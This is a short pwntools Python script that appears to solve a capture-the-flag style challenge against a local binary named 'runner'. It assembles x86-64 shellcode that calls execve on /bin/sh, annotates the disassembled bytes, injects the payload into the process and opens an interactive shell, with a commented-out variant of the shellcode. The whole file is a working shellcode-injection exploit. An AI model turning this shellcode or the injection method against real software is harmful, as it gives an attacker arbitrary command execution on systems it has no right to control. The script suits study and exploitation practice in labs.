# !/usr/bin/python3
from pwn import *

gdb_script = """
b *main+100
c
"""


p = process("./runner")
gdb.attach(p, gdbscript=gdb_script)

context.arch = "amd64"
binsh = u64(b"/bin/sh\x00")


# Cannot LOAD DIRECT strings into RDI. NEED to load pointer
EXECVE = 0x3B


# Push RSP always points to the recently pushed item in stack
# myShellCode = f"""
#     mov rbx, {binsh}
#     xor rsi, rsi
#     xor rdx, rdx
#     mov rax, 0x3b
#     push rbx
#     mov rdi, rsp
#     syscall
# """

# This works because when we call,
# the return address is pushed onto the stack
# and we pop it into RBX
shellCodeUseStack = f""" 
    call pwn
    pwn:
    pop rbx
    lea rdi, [rbx + binsh - pwn]
    xor rdx, rdx
    xor rsi, rsi
    mov rax, {EXECVE}
    syscall
binsh: 
    .string "/bin/sh"
"""
# [+] Waiting for debugger: Done
#    0:   e8 00 00 00 00          call   0x5 (pwn)
#    5:   5b                      pop    rbx
#    6:   48 8d bb 17 00 00 00    lea    rdi, [rbx+0x17] = (rbx + binsh - pwn) = (rbx + 0x1c - 0x5) = rbx + 0x17
#    d:   48 31 d2                xor    rdx, rdx
#   10:   48 31 f6                xor    rsi, rsi
#   13:   48 c7 c0 3b 00 00 00    mov    rax, 0x3b
#   1a:   0f 05                   syscall
#   1c:   2f                      (bad)
#   1d:   62 69 6e 2f 73          (bad)
#   22:   68                      .byte 0x68

payload = asm(shellCodeUseStack)
print(disasm(payload))


p.sendlineafter("that", payload)


p.interactive()
